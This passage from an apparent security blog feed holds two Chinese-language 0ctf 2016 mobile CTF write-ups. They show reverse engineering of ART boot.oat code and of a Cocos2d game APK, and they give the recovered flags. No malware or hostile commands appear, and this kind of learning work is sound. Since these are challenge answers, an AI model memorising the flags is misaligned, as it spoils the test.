&lt;p&gt;上面是boot.oat的内存布局，地址0x72a061F9刚好位于boot.oat的代码段，而boot.oat就是题目提供给我们的c文件。我们来算一算0x72a061F9对应到c文件中的地址。首先我们设置这样几个变量：offset_in_file（文件中的偏移），offset_in_memory（在内存中的偏移），virtual_start_addr（虚拟内存区域的起始地址），physics_start_addr（文件中的起始地址）。offset_in_file的计算公式为：&lt;br&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;offset_in_file = offset_in_memory - virtual_start_addr + physics_start_addr&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;因此地址0x72a061F9对应的boot.oat文件中的地址为：&lt;br&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;offset_in_file = 0x72a061F9 - 0x7298b000 + 0x01a9d000 - 1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;               = 0x1B181F8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;// 因为thumb的关系，所以需要-1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;ok，现在我们找到跳转的地址为boot.oat中的0x1B181F8，接下来我们需要得到boot.oat中的代码，使用oatdump即可。不幸的是我得到这样一个错误：&lt;br&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;Failed to open oat file from &amp;apos;/home/secauo/Android/0ctf_2016/state_of_the_art/state_of_the_art/c&amp;apos;: Invalid oat magic for &amp;apos;/home/secauo/Android/0ctf_2016/state_of_the_art/state_of_the_art/c&amp;apos;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;好吧，oat magic错误，那么就是oat版本的原因了，从b文件得知，magic为039，因此对应的Android版本应该为5.0。再次使用Android5.0的oatdump，将结果保存为c.dump。由于未知的原因（或许是对齐？），地址差了0x1000，也就是为0x1B181F8 - 0x1000 = 0x1b171f8，查看c.dump，此处汇编为：&lt;br&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;19&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;6: void java.lang.String.&amp;lt;init&amp;gt;(byte[]) (dex_method_idx=3180)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  DEX CODE:&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    0x0000: const/4 v0, #+0&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    0x0001: array-length v1, v3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    0x0002: invoke-direct &amp;#123;v2, v3, v0, v1&amp;#125;, void java.lang.String.&amp;lt;init&amp;gt;(byte[], int, int) // method@3182&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    0x0005: return-void&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  OatMethodOffsets (offset=0x0150b098)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    code_offset: 0x01b171f9 &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    gc_map: (offset=0x015fbe3b)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  OatQuickMethodHeader (offset=0x01b171e0)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    mapping_table: (offset=0x018e15b7)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    vmap_table: (offset=0x01a7c99a)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    v3/r5, v1/r6, v2/r7, v65534/r8, v65535/r15&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  QuickMethodFrameInfo&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    frame_size_in_bytes: 64&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    core_spill_mask: 0x000081e0 (r5, r6, r7, r8, r15)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    fp_spill_mask: 0x00000000 &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  CODE: (code_offset=0x01b171f9 size_offset=0x01b171f4 size=80)...&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    0x01b171f8: f5bd5c00    subs    r12, sp, #8192&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;也就是说0x1b171f8（即内存地址0x72a061F9）指向&lt;code&gt;java.lang.String.&amp;lt;init&amp;gt;(byte[])&lt;/code&gt;函数。回到b文件中check函数的分析，0x003721f6此处的’blx     lr’，也就是跳转到&lt;code&gt;java.lang.String.&amp;lt;init&amp;gt;(byte[])&lt;/code&gt;函数。&lt;br&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;0x003721e0: 9a0e        ldr     r2, [sp, #56]   // r2为s3数组对象&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;0x003721e2: 1c06        mov     r6, r0          // r6为上面新建的String对象&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;0x003721e4: f2461ef9    movw    lr, #25081  &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;0x003721e8: f2c72ea0    movt    lr, #29344&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;0x003721ec: f64300b0    movw    r0, #14512&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;0x003721f0: f2c70044    movt    r0, #28740&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;0x003721f4: 1c31        mov     r1, r6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;0x003721f6: 47f0        blx     lr             // 跳转到java.lang.String.&amp;lt;init&amp;gt;(byte[])&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;对应的Java源码为：&lt;br&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;String str1 = new String(s3);&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;后面类似的跳转到c文件的函数，将不再详细分析，本文直接给出结果，读者可按照上述方法自行分析。后续的Java源码为：&lt;br&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;14&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;StringBuilder sb1 = new StringBuilder(str1);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;sb1 = sb1.reverse();&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;String str2 = sb1.toString();&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;StringBuilder sb2 = new StringBuilder();&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;String str3 = new String(d1);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;String str4 = str3.replace(&amp;apos;S&amp;apos;, &amp;apos;e&amp;apos;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;String str5 = str4.replace(&amp;apos;d&amp;apos;, &amp;apos;n&amp;apos;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;String str6 = str5.trim();&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;StringBuilder sb3 = sb2.append(str6);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;StringBuilder sb4 = sb3.append(str2);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;String str7 = new String(s4);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;String str8 = str7.substring(2, 7);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;StringBuilder sb5 = sb4.append(str8);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;String str9 = sb5.toString();&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;整合前面全部Java源码，最后得到获取Flag的Java代码为：&lt;br&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;39&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;40&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;41&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;42&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;43&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;44&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;45&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;46&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;47&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;48&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;49&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;50&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;51&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;public String getFlag() &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    byte[] s1 = new byte[]&amp;#123;0x78, 0x45, 0x78, 0x32, 0x57, 0x37&amp;#125;;               // r10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    byte[] s2 = new byte[]&amp;#123;0x22, 0x29, 0x44, 0x55, 0x60, 0x33&amp;#125;;               // r7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    byte[] s3 = new byte[]&amp;#123;0x17, (byte) 0x94, 0x35, 0x03, (byte) 0x90&amp;#125;;                   // [sp, #56]&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    byte[] s4 = new byte[]&amp;#123;0x45, 0x64, 0x5f, 0x41,0x52, 0x54, 0x7d&amp;#125;;    // [sp, #60]&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    byte[] s5 = new byte[]&amp;#123;0x58, 0x75, 0x1b, (byte) 0xf0, 0x0f, 0x4c&amp;#125;;              // r11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    byte[] s6 = new byte[]&amp;#123;0x69, 0x0c, 0x1b, (byte) 0xbe, (byte) 0xf2, 0x49&amp;#125;;         //[sp, #52]&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    for (int i = 0; i &amp;lt; s2.length; ++i) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        s2[i] = (byte) ((s2[i] + 54) ^ s6[i]);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    for (int i = 0; i &amp;lt; s1.length; i++) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        if (s1[i] == 87) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            s1[i] = 105;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        if (s1[i] == 50) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            s1[i] = ~(123);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        s1[i] = (byte) (s1[i] ^ s5[i]);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    byte[] d1 = new byte[s1.length + s2.length];    // [sp, #40]&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    System.arraycopy(s1, 0, d1, 0, s1.length);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    System.arraycopy(s2, 0, d1, s2.length, s2.length);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    s3[4] = (byte) (s3[4] - 49);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    s3[3] = (byte) (s3[3] + 47);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    s3[2] = (byte) (s3[2] + 42);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    s3[1] = (byte) (s3[1] - 34);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    s3[0] = (byte) (s3[0] + 46);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    String str1 = new String(s3);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    StringBuilder sb1 = new StringBuilder(str1);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    sb1 = sb1.reverse();&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    String str2 = sb1.toString();&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    StringBuilder sb2 = new StringBuilder();&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    String str3 = new String(d1);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    String str4 = str3.replace(&amp;apos;S&amp;apos;, &amp;apos;e&amp;apos;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    String str5 = str4.replace(&amp;apos;d&amp;apos;, &amp;apos;n&amp;apos;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    String str6 = str5.trim();&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    StringBuilder sb3 = sb2.append(str6);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    StringBuilder sb4 = sb3.append(str2);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    String str7 = new String(s4);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    String str8 = str7.substring(2, 7);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    StringBuilder sb5 = sb4.append(str8);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    String str9 = sb5.toString();&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    return str9;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;最后的Flag为：&lt;code&gt;0ctf{1ea5n_2_rE_ART}&lt;/code&gt;。&lt;/p&gt;
</content>
    
    <summary type="html">
    
      &lt;p&gt;本文为2016年0ctf中的mobile题目State of the ART的writeup。
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>0ctf 2016 boomshakalaka writeup</title>
    <link href="http://ele7enxxh.com/0ctf-2016-Boomshakalaka-Writeup.html"/>
    <id>http://ele7enxxh.com/0ctf-2016-Boomshakalaka-Writeup.html</id>
    <published>2016-03-17T14:09:00.000Z</published>
    <updated>2016-03-23T06:24:58.000Z</updated>
    
    <content type="html">&lt;p&gt;本文为2016年0ctf中的mobile题目boomshakalaka的writeup。&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/images/0ctf-2016-boomshakalaka-writeup-1.png&quot; alt=&quot;1&quot;&gt;&lt;/p&gt;
&lt;h2 id=&quot;boomshakalaka&quot;&gt;&lt;a href=&quot;#boomshakalaka&quot; class=&quot;headerlink&quot; title=&quot;boomshakalaka&quot;&gt;&lt;/a&gt;boomshakalaka&lt;/h2&gt;&lt;p&gt;首先&lt;a href=&quot;/downloads/0ctf-2016-boomshakalaka.zip&quot;&gt;点我&lt;/a&gt;下载APK，安装运行APK后，发现是一个类似之前微信上的打飞机游戏。&lt;br&gt;直接用jeb反编译APK，没有任何保护处理，反编译代码如下图：&lt;br&gt;&lt;img src=&quot;/images/0ctf-2016-boomshakalaka-writeup-2.png&quot; alt=&quot;2&quot;&gt;&lt;br&gt;可以看到APK初始化时，新建了两个xml文件，分别为flag.xml和CocosdxPrefsfile.xml，并且分别写入了一些字符串，其中flag文件中的&lt;code&gt;YmF6aW5nYWFhYQ==&lt;/code&gt;明显为base64编码，随便找了个在线base64解码，解码后为&lt;code&gt;bazingaaaa&lt;/code&gt;,再凑上Flag的标志，组合为&lt;code&gt;0ctf{bazingaaaa}&lt;/code&gt;，提交后提示错误。&lt;br&gt;运行游戏，没有得分，直接暂停。CocosdxPrefsfile.xml的内容为：&lt;br&gt;&lt;code&gt;MGN0ZntDMGNvUzJkX0FuRHJv&lt;/code&gt;&lt;br&gt;经过多次测试，每次游戏完成初始化后，CocosdxPrefsfile.xml的内容均为上诉字符串。同样是base64编码，解码后为&lt;code&gt;0ctf{C0coS2d_AnDro&lt;/code&gt;,很明显地方找对了，但是Flag不全。&lt;br&gt;接着继续游戏，随便得了几分，然后撞死。CocosdxPrefsfile.xml的内容为：&lt;br&gt;&lt;code&gt;MGN0ZntDMGNvUzJkX0FuRHJv...dz99&lt;/code&gt;&lt;br&gt;发现除了开始初始化的固定字符串意外，结尾也同样是固定的&lt;code&gt;dz99&lt;/code&gt;，猜测是游戏结束时写入的固定串。&lt;br&gt;根据得到最高分的提示，开始找关于得分的函数。Java层没几个类，因此重心转到so，把libcocos2dcpp.so拖到ida里，通过score关键字找到关键函数&lt;code&gt;ControlLayer::updateScore(int)&lt;/code&gt;，直接F5后，发现逻辑就是根据每次击中飞机得到的分数，向CocosdxPrefsfile.xml写入对应的字符串，如图：&lt;br&gt;&lt;img src=&quot;/images/0ctf-2016-boomshakalaka-writeup-3.png&quot; alt=&quot;3&quot;&gt;&lt;br&gt;&lt;img src=&quot;/images/0ctf-2016-boomshakalaka-writeup-4.png&quot; alt=&quot;4&quot;&gt;&lt;br&gt;值得注意的是，其中最大分数被设置为1000000000分，其对应的字符串为&lt;code&gt;4w&lt;/code&gt;,因此结合前面分析，字符串为:&lt;br&gt;&lt;code&gt;MGN0ZntDMGNvUzJkX0FuRHJv4wdz99&lt;/code&gt;&lt;br&gt;解码后为&lt;code&gt;0ctf{C0coS2d_AnDro?&lt;/code&gt;，出现了乱码，明显还是不对。&lt;br&gt;分析到这里，这道题几乎已经是完成了。剩下的就是开始拼凑Flag了。通过多次尝试，最后我们按照&lt;code&gt;ControlLayer::updateScore(int)&lt;/code&gt;中所有分数的从小到大的顺序，将其对应的字符串组合到一起为：&lt;br&gt;&lt;code&gt;MWRfRzBtRV9Zb1VfS24w&lt;/code&gt;&lt;br&gt;再将头部和尾部组合到一起：&lt;br&gt;&lt;code&gt;MGN0ZntDMGNvUzJkX0FuRHJvMWRfRzBtRV9Zb1VfS24wdz99&lt;/code&gt;&lt;br&gt;解码后为&lt;code&gt;0ctf{C0coS2d_AnDro1d_G0mE_YoU_Kn0w?}&lt;/code&gt;，搞定。&lt;/p&gt;
&lt;h2 id=&quot;总结&quot;&gt;&lt;a href=&quot;#总结&quot; class=&quot;headerlink&quot; title=&quot;总结&quot;&gt;&lt;/a&gt;总结&lt;/h2&gt;&lt;ol&gt;
&lt;li&gt;flag.xml的内容是为了提示我们CocosdxPrefsfile.xml的内容也是base64编码。&lt;/li&gt;
&lt;li&gt;千万不要真的手动打最高分，毫无意义。&lt;/li&gt;
&lt;/ol&gt;
